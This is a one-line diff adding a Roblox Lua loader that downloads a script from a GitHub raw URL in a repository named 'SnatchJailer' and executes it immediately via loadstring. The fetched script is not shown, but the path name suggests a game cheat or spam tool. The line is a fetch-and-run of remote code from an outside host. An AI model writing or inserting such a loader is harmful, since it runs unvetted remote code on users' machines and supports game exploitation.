@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/hide-in-pixels-spam2-to4do39djks3xz.lua"))()
